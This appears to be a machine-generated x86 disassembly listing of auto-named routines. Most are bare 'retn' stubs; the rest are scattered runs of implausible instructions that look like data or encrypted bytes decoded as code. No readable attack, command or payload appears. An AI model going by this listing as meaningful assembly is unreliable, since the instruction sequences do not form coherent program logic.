retn
sub_47f363
retn
sub_47f364
retn
sub_47f365
retn
sub_47f384
retn
sub_47f385
retn
sub_47f386
retn
sub_47f387
or bl dl
push cs
stosd [ edi ]
mov edx 0x53534709
retn
sub_47f391
retn
sub_47f392
retn
sub_47f393
retn
sub_47f3b2
mov ebx 0xacacaeea
mov edx 0xacac97bc
retn
sub_47f3bd
fcom [ esi ]
pop ebx
mov edx 0xacaca24f
retn
sub_47f3c6
retn
sub_47f3c7
retn
sub_47f3c8
retn
sub_47f3c9
retn
sub_47f3ca
retn
sub_47f3cb
retn
sub_47f3cc
retn
sub_47f3cd
retn
sub_47f3ce
retn
sub_47f3f6
retn
sub_47f3f7
retn
sub_47f3f8
retn
sub_47f3f9
retn
sub_47f3fa
retn
sub_47f3fb
retn
sub_47f3fc
retn
sub_47f3fd
retn
sub_47f3fe
retn
sub_47f3ff
retn
sub_47f400
retn
sub_47f401
retn
sub_47f402
retn
sub_47f403
retn
sub_47f404
retn
sub_47f405
retn
sub_47f406
retn
sub_47f407
retn
sub_47f408
retn
sub_47f409
retn
sub_47f40a
retn
sub_47f40b
retn
sub_47f40c
fcomp st6
sub [ esi + 0x3acac ] 0xffffffda
out 0x83 al
scasb [ edi ]
lodsb [ esi ]
lodsb [ esi ]
lodsb [ esi ]
add al 0x43
mov edx 0x53535eda
retn
sub_47f423
retn
sub_47f424
retn
sub_47f425
retn
sub_47f426
retn
sub_47f427
retn
sub_47f428
retn
sub_47f429
mov ebx 0x53535fb2
salc
xchg ebx eax
pop esp
xlat
or [ ebx + 0x53 ] bl
push ebx
pushad
xchg ebx eax
0xc3c3c390 0xc3c3
retn
sub_47f440
retn
sub_47f441
retn
sub_47f442
retn
sub_47f443
retn
sub_47f444
retn
sub_47f445
retn
sub_47f446
shr [ ebx + 0x47d5baac ] 0x1
push ebx
push ebx
retn
sub_47f44f
retn
sub_47f450
retn
sub_47f451
retn
sub_47f452
retn
sub_47f453
retn
sub_47f454
retn
sub_47f455
retn
sub_47f456
retn
sub_47f457
retn
sub_47f458
retn
sub_47f459
retn
sub_47f45a
retn
sub_47f483
xor eax 0x88f0eda
mov edx 0xacacaace
retn
sub_47f48e
retn
sub_47f48f
retn
sub_47f490
shl [ esi ] 0x1
scasd [ edi ]
push ebx
cmp [ ebx + 0xa ] esp
mov edx 0xacac84f2
retn
sub_47f49d
retn
sub_47f49e
retn
sub_47f49f
retn
sub_47f4a0
retn
sub_47f4a1
retn
sub_47f4a2
retn
sub_47f4a3
retn
sub_47f4a4
retn
sub_47f4a5
retn
sub_47f4a6
retn
sub_47f4a7
retn
sub_47f4a8
retn
sub_47f4a9
retn
sub_47f4aa
mov ebx 0x53535498
or ah [ eax - 0x6d ]
adc edi [ edx - 0x5353440f ]
retn
sub_47f4b9
retn
sub_47f4ba
retn
sub_47f4bb
retn
sub_47f4bc
retn
sub_47f4bd
retn
sub_47f4be
retn
sub_47f4bf
retn
sub_47f4c0
retn
sub_47f4c1
retn
sub_47f4c2
retn
sub_47f4c3
retn
sub_47f4f2
retn
sub_47f4f3
retn
sub_47f4f4
retn
sub_47f4f5
retn
sub_47f4f6
retn
sub_47f4f7
retn
sub_47f4f8
salc
xchg ebx eax
mov edx 0xacacb1b2
retn
sub_47f500
retn
sub_47f501
retn
sub_47f502
retn
sub_47f503
fcom [ esi ]
scasd [ edi ]
or eax 0xc3909a08
retn
sub_47f50c
retn
sub_47f50d
retn
sub_47f50e
retn
sub_47f50f
retn
sub_47f510
retn
sub_47f511
retn
sub_47f512
retn
sub_47f513
retn
sub_47f514
retn
sub_47f515
retn
sub_47f516
retn
sub_47f540
retn
sub_47f541
retn
sub_47f542
retn
sub_47f543
retn
sub_47f544
retn
sub_47f545
retn
sub_47f546
retn
sub_47f547
retn
sub_47f548
retn
sub_47f549
retn
sub_47f54a
retn
sub_47f54b
retn
sub_47f54c
retn
sub_47f54d
retn
sub_47f54e
retn
sub_47f54f
retn
sub_47f550
retn
sub_47f551
retn
sub_47f552
retn
sub_47f553
retn
sub_47f554
retn
sub_47f555
retn
sub_47f556
retn
sub_47f557
retn
sub_47f558
retn
sub_47f559
retn
sub_47f55a
retn
sub_47f55b
mov ebx 0xacacb782
rcl [ edi - 0x408a45b9 ] 0x1
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47f569
retn
sub_47f56a
retn
sub_47f56b
retn
sub_47f56c
retn
sub_47f56d
retn
sub_47f56e
retn
sub_47f56f
retn
sub_47f570
retn
sub_47f571
retn
sub_47f572
retn
sub_47f573
retn
sub_47f574
retn
sub_47f575
retn
sub_47f576
retn
sub_47f577
retn
sub_47f578
retn
sub_47f579
retn
sub_47f57a
retn
sub_47f57b
xor eax 0xbab106da
std
xchg edi eax
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47f585
retn
sub_47f586
retn
sub_47f587
retn
sub_47f588
retn
sub_47f589
lodsb [ esi ]
scasd [ edi ]
lodsb [ esi ]
mov bh 0xac
add al 0x4f
mov edx 0xacac9e47
retn
sub_47f598
retn
sub_47f599
retn
sub_47f59a
retn
sub_47f59b
xchg esp eax
push ss
mov edi 0x5181e05
xor eax 0x1ea31694
push ebx
xchg esp eax
push ss
mov ebx [ esi ]
cmp dh [ eax ]
and [ edx - 0x535373a2 ] edi
retn
sub_47f5b5
lodsb [ esi ]
les edi [ ebx - 0x2facacad ]
xchg edi eax
add edi [ edx + 0x53534ff8 ]
retn
sub_47f5c4
retn
sub_47f5c5
retn
sub_47f5c6
retn
sub_47f5c7
retn
sub_47f5c8
retn
sub_47f5c9
retn
sub_47f5ca
retn
sub_47f5cb
fcom [ ebp + 0x5344ddbb ]
push ebx
rcl [ edi + 0x772fd043 ] 0x1
inc edi
push edx
pop esp
salc
push ebp
mov ch [ esp + ebp * 4 - 0x53623346 ]
lodsb [ esi ]
retn
sub_47f5e6
retn
sub_47f5e7
retn
sub_47f5e8
retn
sub_47f5e9
retn
sub_47f5ea
retn
sub_47f5eb
retn
sub_47f5ec
retn
sub_47f5ed
retn
sub_47f5ee
retn
sub_47f615
retn
sub_47f616
retn
sub_47f617
retn
sub_47f618
retn
sub_47f619
retn
sub_47f61a
retn
sub_47f61b
retn
sub_47f61c
retn
sub_47f61d
retn
sub_47f61e
retn
sub_47f61f
retn
sub_47f620
mov edx 0x535341bc
retn
sub_47f626
retn
sub_47f627
retn
sub_47f628
retn
sub_47f629
retn
sub_47f62a
retn
sub_47f62b
retn
sub_47f62c
retn
sub_47f62d
retn
sub_47f62e
retn
sub_47f62f
retn
sub_47f630
retn
sub_47f631
retn
sub_47f632
retn
sub_47f633
retn
sub_47f634
cmp [ ecx ] edx
mov edx 0x53534528
retn
sub_47f63c
retn
sub_47f63d
retn
sub_47f63e
cmp [ ebx + 0x3b ] edx
push ebx
push ebx
inc ebx
push ebx
cmp [ eax - 0x46 ] edx
leave
mov ah 0xac
lodsb [ esi ]
retn
sub_47f64d
retn
sub_47f64e
add al 0x39
xor cl [ ecx ]
cmp [ 0xffffffffd834390a ] esp
xchg ecx eax
xor eax 0xd88716da
xchg edx eax
xor eax 0xb8516da
cmp [ eax ] esp
xor eax 0xb8b16da
mov edx 0xacac8289
retn
sub_47f671
retn
sub_47f672
retn
sub_47f673
retn
sub_47f674
retn
sub_47f675
xor eax 0xbbd16da
cmp [ 0x77ba9bd8 ] edi
sahf
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47f684
retn
sub_47f685
retn
sub_47f686
retn
sub_47f687
retn
sub_47f688
retn
sub_47f689
retn
sub_47f68a
retn
sub_47f68b
retn
sub_47f68c
retn
sub_47f68d
retn
sub_47f68e
retn
sub_47f68f
retn
sub_47f690
retn
sub_47f691
retn
sub_47f692
retn
sub_47f693
retn
sub_47f694
pop esp
aad 0x85
push esi
push ebx
push ebx
add eax 0xd95b26d8
push ebp
mov edx 0x5353471b
retn
sub_47f6a6
xor eax 0xd87316da
xchg ebp eax
mov edx 0xacac84b9
retn
sub_47f6b2
retn
sub_47f6b3
retn
sub_47f6b4
retn
sub_47f6b5
retn
sub_47f6b6
retn
sub_47f6b7
xor eax 0xaa11eda
xor eax 0xd8a71eda
fwait
mov edx 0xacac8e73
retn
sub_47f6c8
retn
sub_47f6c9
retn
sub_47f6ca
retn
sub_47f6cb
retn
sub_47f6cc
retn
sub_47f6e1
fild [ esi - 0x25ca5354 ]
lds edi [ cs : edx + 0x53534955 ]
retn
sub_47f6ef
retn
sub_47f6f0
retn
sub_47f6f1
retn
sub_47f6f2
retn
sub_47f6f3
retn
sub_47f6f4
retn
sub_47f6f5
retn
sub_47f6f6
retn
sub_47f6f7
retn
sub_47f6f8
pop esp
xlat
daa
push esi
push ebx
push ebx
pushad
0xba5f1e6a 0xacdf
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47f709
retn
sub_47f70a
retn
sub_47f70b
retn
sub_47f70c
retn
sub_47f70d
retn
sub_47f70e
retn
sub_47f70f
retn
sub_47f710
retn
sub_47f711
retn
sub_47f712
retn
sub_47f713
retn
sub_47f714
retn
sub_47f715
retn
sub_47f716
retn
sub_47f717
retn
sub_47f718
retn
sub_47f719
retn
sub_47f71a
retn
sub_47f71b
retn
sub_47f71c
retn
sub_47f71d
retn
sub_47f71e
retn
sub_47f71f
retn
sub_47f720
retn
sub_47f721
retn
sub_47f722
retn
sub_47f723
retn
sub_47f724
retn
sub_47f725
retn
sub_47f726
retn
sub_47f727
retn
sub_47f728
retn
sub_47f729
retn
sub_47f72a
retn
sub_47f72b
retn
sub_47f72c
retn
sub_47f72d
retn
sub_47f72e
retn
sub_47f72f
retn
sub_47f730
retn
sub_47f731
retn
sub_47f732
retn
sub_47f733
retn
sub_47f734
retn
sub_47f735
or dh [ edi ]
fcom [ edx - 0x2d ]
sub edx [ ecx + 0x53 ]
mov edx 0xacac83fc
retn
sub_47f760
retn
sub_47f761
retn
sub_47f762
retn
sub_47f763
retn
sub_47f764
retn
sub_47f765
retn
sub_47f766
add al [ eax ]
add eax 0x534aeeba
push ebx
retn
sub_47f76f
retn
sub_47f770
retn
sub_47f771
retn
sub_47f772
retn
sub_47f773
retn
sub_47f774
retn
sub_47f775
pop esp
salc
retn
sub_47f778
pop esi
push ebx
push ebx
mov edx 0xacac8c14
retn
sub_47f781
retn
sub_47f782
xor eax 0xd65c9ad6
mov esi 0x6053534f
xchg ebx eax
nop
retn
sub_47f78f
retn
sub_47f790
retn
sub_47f791
retn
sub_47f792
retn
sub_47f793
retn
sub_47f794
cmp edx [ ebx + 0x63 ]
push ebx
push ebx
lodsb [ esi ]
and eax 0xe3ba0003
xchg edx eax
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47f7a3
retn
sub_47f7a4
retn
sub_47f7a5
retn
sub_47f7a6
mov ebx 0xacaca18d
pushad
xchg ebx eax
adc edi [ edx - 0x53534692 ]
retn
sub_47f7b4
retn
sub_47f7b5
retn
sub_47f7b6
retn
sub_47f7b7
retn
sub_47f7b8
retn
sub_47f7b9
retn
sub_47f7ba
retn
sub_47f7bb
retn
sub_47f7bc
retn
sub_47f7bd
retn
sub_47f7be
retn
sub_47f7bf
retn
sub_47f7c0
retn
sub_47f7c1
retn
sub_47f7c2
retn
sub_47f7c3
retn
sub_47f7c4
retn
sub_47f7e2
retn
sub_47f7e3
retn
sub_47f7e4
cmp [ 0xffffffffb916da35 ] edi
or edi [ ecx ]
daa
mov edx 0xacacb911
retn
sub_47f7f3
retn
sub_47f7f4
retn
sub_47f817
retn
sub_47f818
retn
sub_47f819
retn
sub_47f81a
retn
sub_47f81b
retn
sub_47f81c
retn
sub_47f81d
retn
sub_47f81e
mov edx 0x53535909
retn
sub_47f824
retn
sub_47f825
retn
sub_47f826
retn
sub_47f827
retn
sub_47f828
retn
sub_47f829
retn
sub_47f82a
retn
sub_47f82b
cmp [ ecx + 0xb ] esi
cmp [ esi + 0x35 ] esi
ficom [ esi ]
mov bl 0xb
cmp [ eax ] esp
xor eax 0xbab116da
outsb
xchg ebp eax
lodsb [ esi ]
lodsb [ esi ]
retn
j_sub_47f898
jmp sub_47f898
sub_47f845
push ebx
push ebx
mov edx 0xacac8aac
retn
sub_47f84e
retn
sub_47f84f
retn
sub_47f850
retn
sub_47f851
retn
sub_47f852
retn
sub_47f853
retn
sub_47f854
retn
sub_47f855
retn
sub_47f856
retn
sub_47f857
retn
sub_47f858
retn
sub_47f859
retn
sub_47f85a
retn
sub_47f85b
retn
sub_47f85c
fmul [ ebp + esi - 0x45e8f126 ]
add al 0x4a
push ebx
push ebx
retn
sub_47f868
retn
sub_47f869
retn
sub_47f86a
retn
sub_47f86b
retn
sub_47f86c
retn
sub_47f86d
retn
sub_47f86e
retn
sub_47f86f
retn
sub_47f870
retn
sub_47f871
retn
sub_47f872
retn
sub_47f873
retn
sub_47f874
retn
sub_47f875
retn
sub_47f876
salc
xchg ebx eax
pop esp
salc
retn 0xac82
sub_47f87d
lodsb [ esi ]
ficom [ esi ]
add [ ebx ] 0xffffffd8
push ss
pop ebx
mov edx 0xacac9cac
retn
sub_47f88b
retn
sub_47f88c
retn
sub_47f88d
retn
sub_47f88e
retn
sub_47f88f
retn
sub_47f890
retn
sub_47f891
ficomp [ esi ]
mov eax [ edx ]
cmp [ ebx ] edx
lodsb [ esi ]
sub_47f898
and eax 0x5d28ba03
push ebx
push ebx
retn
sub_47f8a0
retn
sub_47f8a1
pop esp
xlat
push esi
inc edx
push ebx
push ebx
mov edx 0x535343a2
retn
sub_47f8ad
retn
sub_47f8ae
retn
sub_47f8af
add eax 0xacbffaba
lodsb [ esi ]
retn
sub_47f8b6
retn
sub_47f8b7
retn
sub_47f8b8
retn
sub_47f8b9
retn
sub_47f8ba
retn
sub_47f8bb
retn
sub_47f8bc
retn
sub_47f8bd
retn
sub_47f8be
retn
sub_47f8bf
retn
sub_47f8c0
retn
sub_47f8c1
retn
sub_47f8c2
retn
sub_47f8c3
pushad
xchg ebx eax
push 0x2e
scasd [ edi ]
mov edx 0xacac96f6
retn
sub_47f8ce
retn
sub_47f8cf
retn
sub_47f8d0
retn
sub_47f8d1
retn
sub_47f8d2
retn
sub_47f8d3
retn
sub_47f8d4
retn
sub_47f8d5
retn
sub_47f8d6
retn
sub_47f8d7
retn
sub_47f8d8
retn
sub_47f8d9
retn
sub_47f8da
retn
sub_47f8db
retn
sub_47f8dc
retn
sub_47f8dd
retn
sub_47f8de
retn
sub_47f8df
fimul [ esi ]
cmpsd [ esi ] [ edi ]
mov edx 0xacac80ff
retn
sub_47f8e8
retn
sub_47f8e9
retn
sub_47f8ea
retn
sub_47f8eb
retn
sub_47f8ec
retn
sub_47f8ed
retn
sub_47f8ee
retn
sub_47f8ef
retn
sub_47f8f0
add ebx esi
push ss
fstp [ edx - 0x53537210 ]
retn
sub_47f8fa
retn
sub_47f8fb
xor eax 0xbabb16da
out 0x8a eax
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47f905
retn
sub_47f906
retn
sub_47f907
retn
sub_47f908
retn
sub_47f909
retn
sub_47f90a
retn
sub_47f90b
retn
sub_47f90c
retn
sub_47f90d
retn
sub_47f90e
retn
sub_47f90f
retn
sub_47f910
retn
sub_47f911
retn
sub_47f912
lodsb [ esi ]
add al 0x27
mov edx 0xacacb230
retn
sub_47f91b
retn
sub_47f91c
retn
sub_47f91d
retn
sub_47f91e
retn
sub_47f91f
retn
sub_47f920
retn
sub_47f921
retn
sub_47f922
retn
sub_47f923
retn
sub_47f924
retn
sub_47f925
retn
sub_47f926
or eax 0xacb9b9ba
lodsb [ esi ]
retn
sub_47f955
retn
sub_47f956
retn
sub_47f957
retn
sub_47f958
retn
sub_47f959
retn
sub_47f95a
retn
sub_47f95b
retn
sub_47f95c
retn
sub_47f95d
retn
sub_47f95e
retn
sub_47f95f
retn
sub_47f968
test eax 0xe92eda35
cmp [ esi ] esp
mov edx 0xacac9ffc
retn
sub_47f975
cmp ecx [ ebx + edx * 2 + 0x5c ]
push ebx
mov edx 0x53535ac8
retn
sub_47f980
add eax 0x390b0f39
aaa
xor eax 0xbbb16da
mov edx 0x53535ae4
retn
sub_47f991
xor eax 0x39bd06da
fadd [ edx - 0x536c2646 ]
lodsb [ esi ]
retn
sub_47f9b5
fisubr [ ebx - 0x44535352 ]
cdq
mov [ 0xffffffffd5acacac ] eax
out dx eax
push ebx
push ebx
push ebx
mov edx 0x535345e4
retn
sub_47f9cb
retn
sub_47f9cc
retn
sub_47f9cd
retn
sub_47f9ce
retn
sub_47f9cf
retn
sub_47f9d0
retn
sub_47f9d1
fcom [ esi ]
scasd [ edi ]
0xc3c3c390 0xc3c3
retn
sub_47f9dc
retn
sub_47f9dd
retn
sub_47f9de
retn
sub_47f9df
retn
sub_47f9e0
retn
sub_47f9e1
retn
sub_47f9e2
retn
sub_47f9e3
retn
sub_47f9e4
retn
sub_47f9e5
add ebp [ esi + 0x404dba8f ]
push ebx
push ebx
retn
sub_47fa0e
retn
sub_47fa0f
mov edx 0xacac8e96
retn
sub_47fa15
retn
sub_47fa16
retn
sub_47fa17
retn
sub_47fa18
retn
sub_47fa19
lodsb [ esi ]
add al 0x37
shr [ ebx - 0x5028a354 ] 0x1
inc ebp
push ebx
push ebx
lodsb [ esi ]
daa
ja r-xdata
retn
mov edx 0xacacaf43
retn
sub_47fa2f
retn
sub_47fa30
retn
sub_47fa31
retn
sub_47fa32
retn
sub_47fa33
retn
sub_47fa34
retn
sub_47fa35
add eax 0xac97a7ba
lodsb [ esi ]
retn
sub_47fa3c
retn
sub_47fa3d
retn
sub_47fa3e
retn
sub_47fa3f
retn
sub_47fa40
retn
sub_47fa41
retn
sub_47fa42
retn
sub_47fa43
retn
sub_47fa44
retn
sub_47fa45
retn
sub_47fa46
retn
sub_47fa47
retn
sub_47fa48
retn
sub_47fa49
retn
sub_47fa4a
pushad
0xca5c93d6 0xba92
push es
pushfd
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47fa57
cmp ebx [ ebx + 0x51 ]
push ebx
push ebx
mov edx 0xacac8018
retn
sub_47fa7f
retn
sub_47fa80
retn
sub_47fa81
retn
sub_47fa82
retn
sub_47fa83
retn
sub_47fa84
retn
sub_47fa85
retn
sub_47fa86
retn
sub_47fa87
retn
sub_47fa89
retn
sub_47fa8a
retn
sub_47fa8b
retn
sub_47fa8c
retn
sub_47fa8d
retn
sub_47fa8e
retn
sub_47fa8f
retn
sub_47faa6
retn
sub_47faca
fisubr [ ebx - 0x44535352 ]
retn 0x5351
sub_47faec
retn
sub_47faed
retn
sub_47faee
retn
sub_47faef
retn
sub_47faf0
retn
sub_47faf1
retn
sub_47faf2
retn
sub_47faf3
retn
sub_47faf4
retn
sub_47fb13
retn
sub_47fb14
retn
sub_47fb15
mov edx 0xacac9516
retn
sub_47fb1b
retn
sub_47fb1c
retn
sub_47fb1d
retn
sub_47fb1e
retn
sub_47fb1f
retn
sub_47fb20
retn
sub_47fb21
retn
sub_47fb22
retn
sub_47fb23
retn
sub_47fb24
retn
sub_47fb25
xor eax 0xbb516da
cmp [ ecx - 0x46 ] esp
imul edx [ edi - 0x53295354 ] 0x5c
xlat
outsd
popfd
lodsb [ esi ]
lodsb [ esi ]
salc
mov [ edx - 0x53534158 ] bh
retn
sub_47fb4d
call [ ebx + 0x53 ]
push ebx
fcom [ esp + ecx - 0x551145f3 ]
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47fb5b
retn
sub_47fb5c
ficom [ esi ]
cmpsd [ esi ] [ edi ]
add edi [ edx - 0x53536d62 ]
retn
sub_47fb66
retn
sub_47fb67
retn
sub_47fb68
retn
sub_47fb69
retn
sub_47fb6a
retn
sub_47fb6b
retn
sub_47fb6c
retn
sub_47fb6d
retn
sub_47fb6e
mov edx 0xacacad5e
retn
sub_47fb74
retn
sub_47fb75
retn
sub_47fb76
retn
sub_47fb77
retn
sub_47fb78
retn
sub_47fb79
retn
sub_47fb7a
retn
sub_47fb7b
retn
sub_47fb7c
retn
sub_47fb7d
retn
sub_47fb7e
retn
sub_47fb7f
retn
sub_47fb80
retn
sub_47fb81
retn
sub_47fb82
retn
sub_47fb83
retn
sub_47fb84
retn
sub_47fb85
retn
sub_47fb86
retn
sub_47fb87
retn
sub_47fb88
fcomp st6
out 0xab eax
lodsb [ esi ]
lodsb [ esi ]
add ebx eax
xchg ebp eax
mov edx 0xacac9d4f
retn
sub_47fb97
retn
sub_47fb98
retn
sub_47fb99
retn
sub_47fb9a
retn
sub_47fb9b
retn
sub_47fb9c
retn
sub_47fb9d
retn
sub_47fb9e
retn
sub_47fb9f
retn
sub_47fba0
retn
sub_47fba1
cmp [ edi - 0x46 ] edx
fistp [ esi - 0x3c3c5354 ]
retn
sub_47fbab
retn
sub_47fbac
fcomp [ ebx - 0x536d0c45 ]
lodsb [ esi ]
add dh bl
salc
jmp [ ebp - 0x5a455354 ]
sub_47fc50
pop esp
salc
sbb eax 0xbaacac9c
mov al 0x98
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47fc5c
retn
sub_47fc5d
retn
sub_47fc5e
retn
sub_47fc5f
retn
sub_47fc60
retn
sub_47fc61
retn
sub_47fc62
retn
sub_47fc63
retn
sub_47fc64
retn
sub_47fc65
retn
sub_47fc66
retn
sub_47fc67
retn
sub_47fc68
retn
sub_47fcbb
retn
sub_47fcbc
retn
sub_47fcbd
retn
sub_47fcbe
retn
sub_47fcbf
retn
sub_47fcc0
retn
sub_47fcc1
retn
sub_47fcc2
retn
sub_47fcc3
retn
sub_47fcc4
retn
sub_47fcc5
retn
sub_47fcc6
retn
sub_47fcc7
retn
sub_47fcc8
retn
sub_47fcc9
retn
sub_47fcca
retn
sub_47fccb
retn
sub_47fccc
retn
sub_47fccd
retn
sub_47fcce
retn
sub_47fccf
retn
sub_47fcd0
retn
sub_47fcd1
retn
sub_47fcd2
retn
sub_47fcd3
retn
sub_47fcd4
retn
sub_47fcd5
retn
sub_47fcd6
retn
sub_47fd01
retn
sub_47fd02
retn
sub_47fd03
retn
sub_47fd04
retn
sub_47fd05
retn
sub_47fd06
retn
sub_47fd07
retn
sub_47fd08
retn
sub_47fd09
retn
sub_47fd0b
retn
sub_47fd0c
retn
sub_47fd0d
retn
sub_47fd0e
retn
sub_47fd0f
retn
sub_47fd10
pushad
xchg ebx eax
mov edx 0x53535b27
retn
sub_47fd18
retn
sub_47fd19
retn
sub_47fd1a
retn
sub_47fd1b
retn
sub_47fd1c
retn
sub_47fd1d
retn
sub_47fd1e
retn
sub_47fd1f
retn
sub_47fd20
retn
sub_47fd21
lodsb [ esi ]
and ch [ edi + 0x66ba52d8 ]
mov esi 0xc3c3acac
retn
sub_47fd2e
retn
sub_47fd2f
mov edx 0xacacb07d
push es
fdivr [ edi - 0x5bff45fe ]
lodsb [ esi ]
lodsb [ esi ]
retn
sub_47fd3e
retn
sub_47fd3f
retn
sub_47fd40
retn
sub_47fd41
retn
sub_47fd42
retn
sub_47fd43
retn
sub_47fd44
retn
sub_47fd45
retn
sub_47fd46
retn
sub_47fd47
retn
sub_47fd48
retn
sub_47fd65
salc
0x589ad75c 0x5353
add eax 0xacb037ba
lodsb [ esi ]
retn
sub_47fd74
retn
sub_47fd75
retn
sub_47fd76
retn
sub_47fd77
retn
sub_47fd78
retn
sub_47fd79
retn
sub_47fd7a
retn
sub_47fd7b
retn
sub_47fd7c
xor eax 0xbb9f1eda
xor [ edx - 0x66455354 ] edi
inc ebx
push ebx
push ebx
retn
sub_47fd8b
retn
sub_47fd8c
fcomp st6
xchg [ esi + 0x3acac ] ebp
mov edx 0xacac82d3
retn
sub_47fd9a
retn
sub_47fd9b
retn
sub_47fd9c
retn
sub_47fd9d
retn
sub_47fdbe
retn
sub_47fdbf
retn
sub_47fdc0
retn
sub_47fdc1
retn
sub_47fdc2
push es
mov edx 0xacac8f7d
retn
sub_47fdc9
retn
sub_47fdca
retn
sub_47fdcb
retn
sub_47fdcc
retn
sub_47fdcd
retn
sub_47fdce
retn
sub_47fdcf
retn
sub_47fdd0
retn
sub_47fdd1
retn
sub_47fdd2
retn
sub_47fdd3
retn
sub_47fdd4
retn
sub_47fdd5
retn
sub_47fdd6
retn
sub_47fdd7
retn
sub_47fdd8
retn
sub_47fdd9
retn
sub_47fdda
retn
sub_47fddb
retn
sub_47fddc
retn
sub_47fddd
retn
sub_47fdde
retn
sub_47fddf
retn
sub_47fde0
retn
sub_47fde1
retn
sub_47fde2
retn
sub_47fde3
retn
sub_47fde4
retn
sub_47fde5
retn
sub_47fde6
mov edx 0xacac9f51
retn
sub_47fdec
retn
sub_47fded
retn
sub_47fdee
retn
sub_47fdef
retn
sub_47fdf0
retn
sub_47fdf1
retn
sub_47fdf2
retn
sub_47fdf3
retn
sub_47fdf4
retn
sub_47fdf5
retn
sub_47fdf6
retn
sub_47fdfa
rcl [ ebx + 0x53 ] cl
push ebx
mov edx 0xacac8cde
retn
sub_47fe04
retn
sub_47fe05
retn
sub_47fe06
retn
sub_47fe07
retn
sub_47fe08
retn
sub_47fe09
retn
sub_47fe0a
retn
sub_47fe0b
retn
sub_47fe0c
retn
sub_47fe0d
retn
sub_47fe0e
retn
sub_47fe0f
retn
sub_47fe10
retn
sub_47fe11
retn
sub_47fe12
retn
sub_47fe13
retn
sub_47fe14
retn
sub_47fe15
retn
sub_47fe16
retn
sub_47fe17
retn
sub_47fe18
retn
sub_47fe19
retn
sub_47fe1a
retn
sub_47fe1b
retn
sub_47fe2f
cmp [ esi ] esi
or [ 0xffffffffbaa316da ] dh
pop edx
mov edx 0xc3c3acac
retn
sub_47fe3e
retn
sub_47fe3f
retn
sub_47fe40
retn
sub_47fe41
retn
sub_47fe42
retn
sub_47fe43
retn
sub_47fe44
retn
sub_47fe45
retn
sub_47fe46
xor eax 0xba316da
cmp [ edx ] edi
mov edx 0xacac9718
retn
sub_47fe53
retn
sub_47fe54
retn
sub_47fe55
retn
sub_47fe56
retn
sub_47fe57
retn
sub_47fe58
retn
sub_47fe59
retn
sub_47fe5a
retn
sub_47fe5b
retn
sub_47fe5c
retn
sub_47fe5d
retn
sub_47fe5e
retn
sub_47fe5f
retn
sub_47fe60
retn
sub_47fe61
retn
sub_47fe62
retn
sub_47fe63
retn
sub_47fe64
retn
sub_47fe65
retn
sub_47fe66
retn
sub_47fe67
retn
sub_47fe68
retn
sub_47fe69
retn
sub_47fe6a
retn
sub_47fe9c
retn
sub_47fe9d
retn
sub_47fe9e
retn
sub_47fe9f
retn
sub_47fea0
retn
sub_47fec7
xchg ebp eax
push ss
lodsb [ esi ]
push ebx
mov edx 0x53534013
retn
sub_47fed1
retn
sub_47fed2
retn
sub_47fed3
retn
sub_47fed4
retn
sub_47fed5
retn
sub_47ff01
retn
sub_47ff02
retn
sub_47ff03
retn
sub_47ff04
retn
sub_47ff05
retn
sub_47ff06
retn
sub_47ff07
retn
sub_47ff08
retn
sub_47ff09
retn
sub_47ff0a
mov edx 0xacac9f26
retn
sub_47ff10
retn
sub_47ff11
retn
sub_47ff12
retn
sub_47ff13
retn
sub_47ff14
retn
sub_47ff15
retn
sub_47ff16
retn
sub_47ff17
retn
sub_47ff18
retn
sub_47ff19
retn
sub_47ff27
retn
sub_47ff28
retn
sub_47ff29
retn
sub_47ff2a
retn
sub_47ff60
retn
sub_47ff61
retn
sub_47ff62
retn
sub_47ff63
retn
sub_47ff64
retn
sub_47ff65
retn
sub_47ff66
retn
sub_47ff67
retn
sub_47ff68
retn
sub_47ff69
retn
sub_47ff6a
retn
sub_47ff6b
retn
sub_47ff6c
retn
sub_47ff6d
retn
sub_47ff6e
retn
sub_47ff6f
retn
sub_47ff70
retn
sub_47ff71
retn
sub_47ff72
retn
sub_47ff73
retn
sub_47ff74
retn
sub_47ff75
retn
sub_47ff76
mov edx 0xacaca8e5
retn
sub_47ff7c
retn
sub_47ff7d
retn
sub_47ff7e
retn
sub_47ff7f
retn
sub_47ff80
retn
sub_47ff81
retn
sub_47ff82
retn
sub_47ff83
retn
sub_47ff84
retn
sub_47ff85
retn
sub_47ff86
retn
sub_47ff87
retn
sub_47ffcd
retn
sub_47ffce
retn
sub_47ffcf
retn
sub_47ffd0
retn
sub_47ffd1
retn
sub_47ffd2
retn
sub_47ffd3
retn
sub_47ffd4
retn
sub_47fff5
retn
sub_47fff6
retn
sub_47fff7
retn
sub_47fff8
retn
sub_47fff9
retn
sub_47fffa
retn
sub_47fffb
retn
sub_47fffc
retn
sub_47fffd
retn
sub_47fffe
retn
sub_47ffff
retn
sub_480000
ficom [ 0x16d80367 ]
stosd [ edi ]
mov edx 0xacacb7a7
retn
sub_48000d
retn
sub_48000e
retn
sub_48000f
retn
sub_480010
retn
sub_480011
retn
sub_480012
retn
sub_480013
retn
sub_480014
retn
sub_480015
retn
sub_480016
retn
sub_480017
retn
sub_480018
retn
sub_480019
retn
sub_48001a
retn
sub_48001b
retn
sub_48001c
retn
sub_48001d
retn
sub_48001e
retn
sub_48001f
retn
sub_480020
retn
sub_480021
retn
sub_480023
retn
sub_480024
retn
sub_480026
retn
sub_480027
retn
sub_480029
retn
sub_48002a
mov edx 0xacace998
retn
sub_480030
retn
sub_480031
retn
sub_480032
retn
sub_480033
retn
sub_480034
retn
sub_480035
retn
sub_480036
retn
sub_480037
retn
sub_480038
retn
sub_480039
retn
sub_48003a
retn
sub_48003b
retn
sub_48003c
retn
sub_48003d
retn
sub_48003e
retn
sub_48003f
retn
sub_480040
retn
sub_480041
retn
sub_480042
retn
sub_480043
retn
sub_480044
retn
sub_480045
retn
sub_480046
retn
sub_480047
retn
sub_480048
retn
sub_480049
retn
sub_48004a
retn
sub_48004b
retn
sub_48004c
retn
sub_48004d
retn
sub_48004e
retn
sub_48004f
retn
sub_4800a6
retn
sub_4800a7
retn
sub_4800a8
retn
sub_4800a9
retn
sub_4800aa
